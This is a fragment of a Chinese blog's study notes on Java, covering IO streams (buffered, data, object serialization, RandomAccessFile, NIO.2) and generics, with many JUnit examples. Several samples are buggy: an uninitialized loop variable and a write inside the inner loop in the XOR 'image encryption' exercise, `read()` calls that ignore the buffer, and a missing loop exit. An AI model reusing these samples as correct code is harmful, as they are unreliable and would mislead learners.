e","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:3","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"处理流 1.缓冲流(使用的更多) 开发中用缓冲流多，一般不用前面的字节流(FileInputStreamFile、OutputStream) BufferedInputStream BufferedOutputStream BufferedReader BufferedWriter **缓冲流作用：**提供流的读取、写入的速度 —-\u003e 原因：提高读写速度的原因:内部提供了一个缓冲区 处理流, 就是“套接”在已有的流的基础上。 缓冲流与节点流： BufferedInputStream BufferedOutputStream /* BufferedInputStream BufferedOutputStream 缓冲流作用：提供流的读取、写入的速度 ----\u003e 原因：提高读写速度的原因:内部提供了一个缓冲区 */ @Test public void test6(){ //以非文本复制文件为例 bufferCopyFile(\"d:\\\\io\\\\xiaodi.mp4\", \"d:\\\\io\\\\xiaodi2.mp4\"); } public void bufferCopyFile(String srcPath, String dstPath){ //缓冲流与字节流 FileInputStream fis = null; FileOutputStream fos = null; BufferedInputStream bis = null; BufferedOutputStream bos = null; try{ //1.造文件 File srcFile = new File(srcPath); File dstFile = new File(dstPath); //2.造流(处理流不能直接作用域文件上): 先造里层的流, 再造外层的流 //2.1造节点流 fis = new FileInputStream(srcFile); fos = new FileOutputStream(dstFile); //2.2造缓冲流 bis = new BufferedInputStream(fis); bos = new BufferedOutputStream(fos); //3.复制的过程: 读取，写入 byte[] buffer = new byte[10]; // 并不是越大越好(太大了占内存大了，找个适中的) int len; //记录每次读入的字节的个数 while ((len = bis.read(buffer)) != -1){ // 用bis来read bos.write(buffer, 0, len); // 用bos来write，每次写10个字节 } System.out.println(\"复制ok.\"); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.关闭资源（要求:先关外层的流(处理流), 在关里层的流） // 说明：在关闭外层流的同时，内层流也会自动关闭(我们可以省略不写了就) try{ if(bis != null){ bis.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(bos != null){ bos.close(); } }catch (Exception e){ e.printStackTrace(); } } } 缓冲流与字符流：（） BufferedReader BufferedWriter //以文本文件复制为例 // BufferedReader、BufferedWriter bufferCopyTxtFile(\"d:\\\\io\\\\1.txt\", \"d:\\\\io\\\\11111.txt\"); public void bufferCopyTxtFile(String srcPath, String dstPath){ //缓冲流与字符流 BufferedReader br = null; BufferedWriter bw = null; try{ //1.造文件、造流(熟练之后可以这样写在一起) br = new BufferedReader(new FileReader(new File(srcPath))); bw = new BufferedWriter(new FileWriter(new File(dstPath))); //2.读取，写入(字符流) //方式1： // char[] cbuf = new char[1024]; // int len; //记录每次读入的个数 // while ((len = br.read(cbuf)) != -1){ // 用bis来read // bw.write(cbuf, 0, len); //// bw.flush(); // } //方式2： String data; while((data = br.readLine()) != null){ //一次读一行 //方法1： bw.write(data + \"\\n\"); //data中不包含换行符 //方法2： bw.write(data ); //data中不包含换行符 bw.newLine(); //提供换行操作 } System.out.println(\"复制ok.\"); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.关闭资源（要求:先关外层的流(处理流), 在关里层的流） // 说明：在关闭外层流的同时，内层流也会自动关闭(我们可以省略不写了就) try{ if(br != null){ br.close(); } }catch (Exception e){ e.printStackTrace(); } try{ if(bw != null){ bw.close(); } }catch (Exception e){ e.printStackTrace(); } } } 练习1：实现图片加密操作 //提示: //图片加密： FileInputStream fis = new FileInputStream(srcFile); FileOutputStream fos = new FileOutputStream(dstFile); byte[] buffer = new byte[1024]; int len; //记录每次读入的字节的个数 while ((len = fis.read(buffer)) != -1){ for(int i; i\u003clen; i++){ buffer[i] = (byte)(buffer[i]^5); //每位字节做了异或的运算 fos.write(buffer, 0, len); } } //图片解密： FileInputStream fis = new FileInputStream(\"加密后的文件\"); FileOutputStream fos = new FileOutputStream(dstFile); byte[] buffer = new byte[1024]; int len; //记录每次读入的字节的个数 while ((len = fis.read(buffer)) != -1){ for(int i; i\u003clen; i++){ buffer[i] = (byte)(buffer[i]^5); //每位字节做了异或的运算，还原 fos.write(buffer, 0, len); } } 练习1*2：获取文本上每个字符出现的次数 //提示:遍历文本的每一个字符;字符及出现的次数保存在Map中(key是字符,value是次数);将Map中数据写入文件 package cn.xpshuai.java3; import org.junit.Test; import java.io.*; import java.util.HashMap; import java.util.Map; import java.util.Set; /** * * 思路： * 1.遍历文本每一个字符 * 2.字符出现的次数存在Map中 * * Map\u003cCharacter,Integer\u003e map = new HashMap\u003cCharacter,Integer\u003e(); * map.put('a',18); * map.put('你',2); * * 3.把map中的数据写入文件 * */ public class WordCount { /* 说明：如果使用单元测试，文件相对路径为当前module 如果使用main()测试，文件相对路径为当前工程 */ @Test public void testWordCount() { FileReader fr = null; BufferedWriter bw = null; try { //1.创建Map集合 Map\u003cCharacter, Integer\u003e map = new HashMap\u003cCharacter, Integer\u003e(); //2.遍历每一个字符,每一个字符出现的次数放到map中 fr = new FileReader(\"dbcp.txt\"); int c = 0; while ((c = fr.read()) != -1) { //int 还原 char char ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:4","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"标准输入、输出流(了解即可) System.in和System.out分别代表了系统标准的输入和输出设备 默认输入设备是:键盘，输出设备是:显示器 System.in的类型是InputStream System.out的类型是PrintStream，其是OutputStream的子类FilterOutputStream 的子类 重定向:通过System类的setIn，setOut方法对默认设备进行改变。 public static void setln(InputStream in) public static void setOut(PrintStream out) /* 标准输入、输出流 1. System.in:标准的输入流，默认从键盘输出 System.out:标准的输出流，默认从控制台输出 2. System类的setIn(InputStream is) / setOut(PrintStream ps)方式重新指定输入和输出的流 */ @Test public void test(){ // 练习：从键盘输入字符串，要求将读取到的整行字符串转成大写输出。然后继续进行输入操作，直至当输入“e”或者“exit”时，退出程序。 // 方法1： 可以用Scanner来做, 调用next()返回一个字符串 // 方法2：System.in --\u003e 转换流 --\u003e BufferedReader的readLine() BufferedReader br = null; try{ InputStreamReader isr = new InputStreamReader(System.in); br = new BufferedReader(isr); while (true){ System.out.println(\"请输入字符串：\"); String data = br.readLine(); if(\"e\".equalsIgnoreCase(data) || \"exit\".equalsIgnoreCase(data)){ System.out.println(\"程序结束\"); } String upperCase = data.toUpperCase(); System.out.println(upperCase); } }catch (Exception e){ e.printStackTrace(); }finally { if(br != null){ try{ br.close(); }catch (Exception e){ e.printStackTrace(); } } } } ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:5","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"打印流(了解即可) 实现将基本数据类型的数据格式转化为字符串输出 打印流:PrintStream和PrintWriter 提供了一系列重载的print()和printIln()方法，用于多种数据类型的输 PrintStream和PrintWriter的输出不会抛出IOException异常 PrintStream和PrintWriter有自动flush功能 PrintStream打印的所有字符都使用平台的默认字符编码转换为字节。在需要写入字符而不是写入字节的情况下，应该使用 PrintWriter类。 System.out返回的是PrintStream的实例 提供了一些列重载的print()和println() ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:6","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"数据流(了解即可) ​ 作用: 用于读取或写出基本数据类型的变量或字符串 为了方便地操作Java语言的基本数据类型和String的数据，可以使用数据流。 数据流有两个类:(用于读取和写出基本数据类型、String类的数据) DatalnputStream和 DataOutputStream 分别“套接”在InputStream和 OutputStream子类的流上 DatalnputStream中的方法 boolean readBoolean() byte readByte() char readChar( float readFloat() double readDouble() short readShort() long readLong() int readInt() String readUTF( void readFully(byte[ b) DataOutputStream中的方法 将上述的方法的read改为相应的write即可。 /* 数据流 1. DataInputStream DataOutputStream 2. 作用:用于读取或写出基本数据类型的变量或字符串, 基本数据类型持久换 3.Note: 读取不同类型的数据要与当初写入文件时，保存的数据的顺序一致 */ @Test public void test2() throws IOException { // 练习：将内存中的字符串、基本数据类型的变量写出到文件中。| DataOutputStream dos = new DataOutputStream(new FileOutputStream(\"1.txt\")); dos.writeUTF(\"小小\"); dos.flush(); //刷新操作，将内存中数据写入 dos.writeInt(18); dos.flush(); dos.close(); //这个文件也要用数据流读 //将文件中存储的基本数据类型和字符串读取到内存中，保存在变量中 DataInputStream dos2 = new DataInputStream(new FileInputStream(\"1.txt\")); String name = dos2.readUTF(); int age = dos2.readInt(); dos2.close(); } ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:7","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"对象流(重点) ​ 作用: 用于读取或写出对象, 对象持久换 ObjectInputStream和ObjectOutputSteam 用于存储和读取基本数据类型数据或对象的处理流。它的强大之处就是可以把Java中的对象写入到数据源中，也能把对象从数据源中还原回来。 序列化: 用ObjectOutputStream类保存基木类型数据或对象的机制 反序列化: 用ObjectInputStream类读取基木类型数据或对象的机 ObjectOutputStream和IObjectlnputStream不能序列化static利transient修饰的成员变量 对象的序列化 对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到另一个网络节点。当其它程序获取了这种二进制流，就可以恢复成原来的Java对象 序列化的好处在于可将任何实现了Serializable接口的对象转化为字节数据，使其在保存和传输时可被还原 序列化是 **RMI(**Remote Method Invoke -远程方法调用)过程的参数和返回值都必须实现的机制，而 RMI是JavaEE的基础。因此序列化机制是JavaEE平台的基础 如果需要让某个对象支持序列化机制，则必须让对象所属的类及其属性是可序列化的，为了让某个类是可序列化的，该类必须实现如下两个接口之一。否则，会抛出NotSerializableException异常 Serializable Externalizable 要想序列化自定义类，需要满足哪些要求？ 自定义需要满足如下要求，方可序列化 需要实现接口：Serializable 当前类提供一个全局常量：serialVersionUID static final long serialVersionUID = 446768135468782L; 除了当前自定义类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的(但是默认情况下，基本数据类型是可序列化的)，内部如果有其他自定义类，就需要让其他类也实现Serializable接口 代码： package cn.xpshuai.java1; import org.junit.Test; import java.io.*; /** * @author: 剑胆琴心 * @create: 2021-01-30 14:47 * @功能：对象流 * 1. * ObjectInputStream * ObjectOutputSteam * *2.要想序列化自定义类，需要满足哪些要求？ * * Person需要满足如下要求，方可序列化 * * 1.需要实现接口：Serializable * * 2.当前类提供一个全局常量：serialVersionUID * * static final long serialVersionUID = 446768135468782L; * 3.除了当前Person类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的 * (但是默认情况下，基本数据类型是可序列化的)内部如果有其他自定义类，就需要让其他类也实现Serializable接口 * * * 4.序列化机制： * 对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从 * 而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到 * 另一个网络节点。当其它程序获取了这种二进制流，就可以恢复成原来的Java对象 * * * */ public class ObjectStream { /* 序列化过程：将内存中的Java对象保存到磁盘中或通过网络传输出去 使用ObjectOutputStream实现 */ @Test public void test(){ ObjectOutputStream oos = null; try { //1. oos = new ObjectOutputStream(new FileOutputStream(\"d:\\\\io\\\\233.txt\")); //这个文件不是让你打开的，想看就用反序列化 //2. oos.writeObject(new String(\"我爱天安门\")); oos.flush(); //也可以序列化自定义类 // oos.writeObject(new Person(\"Tom\", 18)); oos.flush(); oos.writeObject(new Person(\"Tom2\", 18, new Account(1000))); oos.flush(); } catch (IOException e) { e.printStackTrace(); }finally { if(oos != null){ try { //3. oos.close(); } catch (IOException e) { e.printStackTrace(); } } } } /* 反序列化：将磁盘文件中的对象或网络中的序列化的东西，还原为内存中的Java对象 使用 ObjectInputStream */ @Test public void test1(){ ObjectInputStream ois = null; try { //1. ois = new ObjectInputStream(new FileInputStream(\"d:\\\\io\\\\233.txt\")); // 通过反序列化来查看前面保存的文件内容 //2. Object obj = ois.readObject(); String str = (String)obj; //看一下自定义类反序列化后 Person p = (Person)ois.readObject(); System.out.println(p.toString()); } catch (Exception e) { e.printStackTrace(); }finally { if(ois != null){ try { //3. ois.close(); } catch (IOException e) { e.printStackTrace(); } } } } @Test public void test2(){ } @Test public void test3(){ } } package cn.xpshuai.java1; import java.io.Serializable; /** * @author: 剑胆琴心 * @create: 2021-01-30 17:25 * @功能： 自定义的可被序列化的类 * * Person需要满足如下要求，方可序列化 * 1.需要实现接口：Serializable * 2.当前类提供一个全局常量：serialVersionUID * static final long serialVersionUID = 446768135468782L; * * 3.除了当前Person类需要实现Serializable接口之外，还必须保证其内部所有属性也是可序列化的 * (但是默认情况下，基本数据类型是可序列化的)内部如果有其他自定义类，就需要让其他类也实现Serializable接口 * * 补充： * ObjectOutputStream和IObjectlnputStream不**能序列化static利transient修饰的**成员变量 * * */ public class Person implements Serializable { static final long serialVersionUID = 446768135468782L; private String name; private int age; private Account acc; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public Person(String name, int age, Account acc) { this.name = name; this.age = age; this.acc = acc; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Person{\" + \"name='\" + name + '\\'' + \", age=\" + age + \", acc=\" + acc + '}'; } } class Account implements Serializable{ static final long serialVersionUID = 44676813666782L; private double balance; public Account() { } public Account(double b","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:8","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"随机存取文件流(了解即可) RandomAccessFile类 RandomAccessFile声明在java.io包下，但直接继承于java.lang.Object类。并且它实现了Datalnput、DataOutput这两个接口，也就意味着这个类既可以读也可以写。 RandomAccessFile类支持“随机访问”的方式，程序可以直接跳到文件的任意地方来读、写文件 支持只访问文件的部分内容 可以向已存在的文件后追加内容 RandomAccessFile对象包含一个记录指针，用以标示当前读写处的位置。RandomAccessFile 类对象可以自由移动记录指针: long getFilePointer():获取文件记录指针的当前位置 void seek(long pos):将文件记录指针定位到pos位置 构造器 public RandomAccessFile(File file, String mode) public RandomAccessFile(String name, string made) 创建RandomAccessFile类实例需要指定一个mode参数，该参数指定RandomAccessFile的访问模式: r:以只读方式打开 rw:打开以便读取和写入 rwd:打开以便读取和写入:同步文件内容的更新 rws:打开以便读取和写入;同步文件内容和元薮据的更新 如果模式为只读r。则不会创建文件，而是会去读取一个已经存在的文件,如果读取的文件不存在则会出现异常。 如果模式为rw读写。如果文件不存在则会去创建文件，如果存在则不会创建。 package cn.xpshuai.java1; import org.junit.Test; import java.io.File; import java.io.IOException; import java.io.RandomAccessFile; /** * @author: 剑胆琴心 * @create: 2021-01-30 17:46 * @功能：随机存取文件流 * * 1.直接继承java.lang.Object类 * 实现了DataInput和DataOutput接口 * RandomAccessFile，既可以输入也可以输出(但是复制的时候还是需要造两个对象哦) * * *2.如果RandomAccessFile作为输出李璐，写出到的文件如果不存在，则在执行过程中自动创建 * 如果写出的文件存在，则会对原有文件从头覆盖 * * * 3.通过相关操作，实现RandomAccessFile对文件内容实现插入式的效果 * */ public class RandomStream { @Test public void test() throws IOException { // 1.造输入流、输出流 RandomAccessFile raf1 = new RandomAccessFile(new File(\"d:\\\\io\\\\1.txt\"), \"r\"); RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\1111111.txt\"), \"rw\"); // 2.读写过程 byte[] buffer = new byte[1024]; int len; while ((len = raf1.read()) != -1){ raf2.write(buffer, 0, len); } // 3.关闭 raf1.close(); raf2.close(); } /* 测试 对文本内容的覆盖 */ @Test public void test2() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\"); raf2.write(\"xxx\".getBytes()); raf2.close(); } /* 实现数据的插入：seek(long pos) --\u003e将文件记录定位到指针位置 */ @Test public void test3() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\"); raf2.seek(3); //指针调到角标为3的位置(第四个字符) raf2.write(\"xxx\".getBytes()); // write 直接覆盖了第四个位置原有字符 //实现指定位置的插入数据的追加效果(不覆盖原有位置的字符) raf2.close(); } /* 实现数据的插入：seek(long pos) --\u003e将文件记录定位到指针位置 实现指定位置的插入数据的追加效果(不覆盖原有位置的字符) */ @Test public void test4() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File(\"d:\\\\io\\\\hello1.txt\"), \"rw\"); raf2.seek(3); //指针调到角标为3的位置(第四个字符) //保存指针3后面的数据 StringBuilder builder = new StringBuilder((int)new File(\"d:\\\\io\\1.txt\").length()); byte[] buffer = new byte[1024]; int len; while ((len = raf2.read()) != -1){ builder.append(new String(buffer,0,len)); } //调回指针 raf2.seek(3); raf2.write(\"XXX\".getBytes()); //将StringBuilder中的数据写回去 raf2.write(builder.toString().getBytes()); raf2.close(); } } ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:9","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"NIO.2中Path、Paths、Files类的使用(了解即可) Java NIO Java NIO (New lO，Non-Blocking lO)是从Java 1.4版木开始引入的一套新的IOAPI，可以替代标准的Java lO API。NIO与原来的IO有同样的作用和目的，但是使用的方式完全不同，NIO支持面向缓冲区的(IO是面向流的)、基于通道的IO操作。NIO将以更加高效的方式进行文件的读写操作。 Java API中提供了两套NIO，一套是针对标准输入输出NIO，另一套就是网络编程NIO. |-----java.nio.channels.Channel |-----FileChannel:处理本地文件 |-----SocketChannel:TCP网络编程的客户端的Channel |-----ServerSocketChannel:TCP网络编程的服务器端的Channel |-----DatagramChannel:UDP网络编程中发送端和接收端的Channel NIO.2 随着JDK7的发布，Java对NIO进行了极大的扩展，增强了对文件处理和文件系统特性的支持，以至于我们称他们为NIO.2。因为NIO提供的一些功能，NIO已经成为文件处理中越来越重要的部分。 Path、Paths和Files核心API: 早期的Java只提供了一个File类来访问文件系统，但File类的功能比较有限，提供的方法性能也不高。而且，大多数方法在出错时仅返回失败，并不会提供异常信息。 NIO.2为了弥补这种不足，引入了Path接口，代表一个平台无关的平台路径,描述了目录结构中文件的位置。Path可以看成是File类的升级版木，实际引用的资源也可以不存在。 在以前IO操作都是这样写的: import java.io.File; File file = new File(\"index.html\"); 但在Java7中，我们可以这样写: import java.nio.file.Path; import java.nio.file.Paths; Path path = Paths.get(\"\"index.html\"); 同时，NIO.2在java.nio.file包下还提供了Files、Paths工具类，Files包含了大量静态的工具方法来操作文件: Paths则包含了两个返回Path的静态工厂方法。 Paths类提供的静态 get()方法用来获取Path对象: static Path get(String first, string ... more): //用于将多个字符串串连成路径 static Path get(URl uri): //返回指定uri对应的Path路径 Files类： 题外话: **IDEA导入jar包：**复制到目录下，右击–\u003e add as Library ， 然后就可以用了(里面放的class文件，可以对它进行反编译) ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:10","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"为什么要有泛型 泛型：标签 集合容器类在设计阶段/声明阶段不能确定这个容器到底实际存的是什么类型的对象，所以在JDK1.5之前只能把元素类型设计为Object，JDK1.5之后使用泛型来解决。因为这个时候除了元素的类型不确定，其他的部分是确定的，例如关于这个元素如何保存，如何管理等是确定的，因此此时把元素的类型设计成一个参数，这个类型参数叫做泛型。Collection\u003cE\u003e，List\u003cE\u003e，ArrayList\u003cE\u003e这个就是类型参数，即泛型。 * 举例： * 中药店，每个出题外面贴着标签 * 超市购物加上很多瓶子，每个瓶子装的是什么，有标签 泛型的概念 所谓泛型，就是允许在定义类、接口时通过一个标识表示类中某个属性的类型或者是某个方法的返回值及参数类型。这个类型参数将在使用时（例如，继承或实现这个接口，用这个类型声明变量、创建对象时）确定（即传入实际的类型参数，也称为类型实参)。 从JDK1.5以后，Java引入了“参数化类型(Parameterized type)”的概念，允许我们在创建集合时再指定集合元素的类型，正如: List\u003cString\u003e，这表明该List只能保存字符串类型的对象 JDK1.5改写了集合框架中的全部接口和类，为这些接口、类增加了泛型支持，从而可以在声明集合变量、创建集合对象时传入类型实参。 使用与不使用泛型的区别： ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:1","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":"在集合中使用泛型 /** 泛型的使用： *1.从JDK1.5以后新增的特性 * *2.在集合中使用泛型： * (1).集合接口或集合类在jdk5.0时都修改为带泛型的结构 * (2).在实例化集合类时，可以指明具体的泛型类型 * (3).指明完以后，在集合类或接口中凡是定义类或接口时，内部结构(比如方法、构造器、属性等)使用到类的泛型的位置，都指定为实例化的泛型类型 * 比如：add(E e) --\u003e 实例化时候: add(Integer e) * (4).泛型的类型必须是类，不能是基本数据类型。需要用到基本数据类型的位置，拿包装类替换 * (5).如果实例化时，没有指定泛型的类型，默认类型为java.lang.Object类型 * **/ /* * 在集合中不使用泛型的情况 * */ @Test public void test(){ ArrayList list = new ArrayList(); // 存放学生成绩 list.add(78); list.add(99); list.add(88); list.add(65); //问题1：类型不安全 list.add(\"Tom\"); for(Object score: list){ //问题2：强转时，可能出现ClassCastException int stuScore = (Integer) score; System.out.println(stuScore); } } /* * 在集合中使用泛型的情况: 以ArrayList为例 * */ @Test public void test1(){ ArrayList\u003cInteger\u003e list = new ArrayList\u003cInteger\u003e(); // 用Integer而不是int，泛型是类型，不能用基本类型所以用包装类 //这样传入的对象只能是Integer类型的了 list.add(78); list.add(99); list.add(88); list.add(65); // 编译时，就会进行类型检查，保证数据的安全 // list.add(\"Tom\"); //方式1： for(Integer score: list){ // 避免了强转操作 int stuScore = score; System.out.println(stuScore); } //方式2： Iterator\u003cInteger\u003e iterator = list.iterator(); while (iterator.hasNext()){ int nu = iterator.next(); System.out.println(nu); } } /* * 在集合中使用泛型的情况: 以HashMap为例 * */ @Test public void test2(){ Map\u003cString, Integer\u003e map = new HashMap\u003cString, Integer\u003e(); // key-value两个类型都要指定 map.put(\"TOm\", 18); map.put(\"Tom\", 20); map.put(\"Jerry\", 18); //取 //泛型的嵌套 // Entry是Map里面的，没有暴露在外面 Set\u003cMap.Entry\u003cString, Integer\u003e\u003e entries = map.entrySet(); Iterator\u003cMap.Entry\u003cString, Integer\u003e\u003e iterator = entries.iterator(); while (iterator.hasNext()){ Map.Entry\u003cString, Integer\u003e entry = iterator.next(); String key = entry.getKey(); Integer val = entry.getValue(); } // jdk7新特性：类型推断 Map\u003cString, Integer\u003e map2 = new HashMap\u003c\u003e(); //后面可省略 } ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:2","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":"自定义泛型 自定义的泛型类： package cn.xpshuai.java1; import java.util.ArrayList; import java.util.List; /** * @author: 剑胆琴心 * @create: 2021-01-28 14:28 * @功能：自定义泛型结构：泛型类、泛型接口、泛型方法 * * T, E * k,v 一般为键值 */ public class Order\u003cT\u003e { String orderName; int orderId; //类的内部结构就可以使用类的泛型 T orderT; public Order(){ // T[] arr = new T[10]; //编译不通过， 不能new // T[] arr = (T[]) new Object[10]; //这样可以，但是一般不这么用 } public Order(String orderName, int orderId, T orderT) { this.orderName = orderName; this.orderId = orderId; this.orderT = orderT; } //如下上方法都不是泛型方法 public T getOrderT(){ return orderT; } public void setOrderT(T orderT){ this.orderT = orderT; } @Override public String toString() { return \"Order{\" + \"orderName='\" + orderName + '\\'' + \", orderId='\" + orderId + '\\'' + \", orderT=\" + orderT + '}'; } //静态方法中不能使用类的泛型 // public static void show(T orderT){ // System.out.println(\"show\"); // } // public static void show2(){ // 编译不通过 // try{ // // }catch (T t){ // // } // } //泛型方法：在方法中出现了泛型的结构，泛型参数与类的泛型参数没有任何关系 //换句话说：泛型方达所属的类是不是泛型类都没有关系。 public \u003cE\u003e List\u003cE\u003e copyFromArrayToList(E[] arr){ // E类型的数组, 前面也要加\u003cE\u003e ArrayList\u003cE\u003e list = new ArrayList\u003c\u003e(); for(E e: arr){ list.add(e); } return list; } } 使用: @Test public void test3(){ // 使用自定义的泛型类 Order.java // 如果定义了泛型类，实例化没有指明类的泛型，则认为此泛型类型为Object类型 // 要求：如果定义了类是带泛型的，建议在实例化时要指明类的泛型。 // Order order = new Order(); // order.setOrderT(12); // order.setOrderT(\"AA\"); Order\u003cString\u003e order = new Order\u003cString\u003e(\"orderAA\", 1001, \"我是泛型小实例1\"); order.setOrderT(\"我是泛型小实例:2\"); System.out.println(order.getOrderT()); //【泛型在继承上的体现】 //如果子类指明了具体的泛型类型，使用子类实例化的时候就不用写泛型的形式了 SubOrder sub = new SubOrder(); //由于子类在继承带泛型的父类时，指明了泛型类型。则实例化子类对象时，不再需要指明泛型。 sub.setOrderT(111); // 子类不具体父类中指明泛型的类型，SubOrder1\u003cT\u003e仍然是泛型类，使用子类实例化的时候仍然写泛型的形式了 SubOrder1\u003cString\u003e sub1 = new SubOrder1\u003c\u003e(); sub1.setOrderT(\"CCC\"); } 泛型类的子类： package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-01-28 14:40 * @功能：Order的子类 */ //这里如果指明了具体的泛型类型，使用子类实例化的时候就不用写泛型的形式了 public class SubOrder extends Order\u003cInteger\u003e{ //...... } 泛型类的子类2: package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-01-28 14:46 * @功能：这里的子类不具体父类中指明泛型的类型，SubOrder1\u003cT\u003e仍然是泛型类，使用子类实例化的时候仍然写泛型的形式了 */ public class SubOrder1\u003cT\u003e extends Order\u003cT\u003e { } 自定义泛型类与泛型接口的注意点： 泛型类可能有多个参数，此时应将多个参数一起放在尖括号内。比如:\u003cE1,E2,E3\u003e 泛型类声明的构造器如下:public GenericClass()。而下面是错误的:public GenericClass\u003cE\u003e() 实例化后，操作原来泛型位置的结构必须与指定的泛型类型一致。 泛型不同的引用不能相互赋值（尽管在编译时ArrayList\u003cString\u003e和ArrayList\u003cInteger\u003e是两种类型，但是，在运行时只有一个ArrayList被加载到JVM中）。 泛型如果不指定，将被擦除，泛型对应的类型均按照Object处理，但不等价于Object。经验: 泛型要使用一路都用。要不用，一路都不要用。 如果泛型结构是一个接口或抽象类，则不可创建泛型类的对象。 jdk1.7，泛型的简化操作:ArrayList\u003cFruit\u003e flist = new ArrayList\u003c\u003e(); 泛型的指定中不能使用基本数据类型，可以使用包装类替换。 在类/接口上声明的泛型，在本类或本接口中即代表某种类型，可以作为非静态属性的类型、非静态方法的参数类型、非静态方法的返回值类型。但在静态方法中不能使用类的泛型。 异常类是不能声明为泛型的(public calss MyExpection\u003cT\u003e extends Exception是错误的) 不能使用new E[]。但是可以:E]elements =(E[])new Object[capacity]; 参考: ArrayList源码中声明:Object[]elementData，而非泛型参数类型数组。 父类有泛型，子类可以选择保留泛型也可以选择指定泛型类型: 子类不保留父类的泛型: 按需实现 没有类型：擦除 具体类型 子类保留父类的泛型:泛型子类 全部保留 部分保留 **结论:**子类必须是“富二代”，子类除了指定或保留父类的泛型，还可以增加自己的泛型 @Test public void test4(){ // 泛型不同的引用不能相互赋值 ArrayList\u003cString\u003e l1 = null; ArrayList\u003cInteger\u003e l2 = null; // l2 = l1; //不能相互赋值 } 泛型方法(重难点)： package cn.xpshuai.java1; import java.util.ArrayList; import java.util.List; /** * @author: 剑胆琴心 * @create: 2021-01-28 14:28 * @功能：自定义泛型结构：泛型类、泛型接口、泛型方法 * * T, E * k,v 一般为键值 */ public class Order\u003cT\u003e { String orderName; int orderId; //类的内部结构就可以使用类的泛型 T orderT; public Order(){ // T[] arr = new T[10]; //编译不通过， 不能new // T[] arr = (T[]) new Object[10]; //这样可以，但是一般不这么用 } public Order(String orderName, int orderId, T orderT) { this.orderName = orderName; this.orderId = orderId; this.orderT = orderT; } //如下上方法都不是泛型方法 public T getOrderT(){ return orderT; } public void setOrderT(T orderT){ this.orderT = orderT; } @Override public String toString() { return \"Order{\" + \"orderName='\" + orderName + '\\'' + \", orderId='\" + orderId + '\\'' + \", orderT=\" + orderT + '}'; } //静态方法中不能使用类的泛型(当时还没有这个对象) // public static void show(T orderT){ // System.out.println(\"show\"); 